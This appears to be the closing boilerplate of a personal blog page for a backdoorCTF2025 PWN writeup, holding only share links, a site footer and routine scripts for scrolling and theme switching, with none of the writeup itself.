href="https://telegram.me/share/url?text=backdoorCTF2025%20PWN%20Writeup&amp;url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fbackdoorctf2025-writeup%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share backdoorCTF2025 PWN Writeup on ycombinator" href="https://news.ycombinator.com/submitlink?t=backdoorCTF2025%20PWN%20Writeup&u=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fbackdoorctf2025-writeup%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://wgggggggg.github.io/>Wgg's Blog Site</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>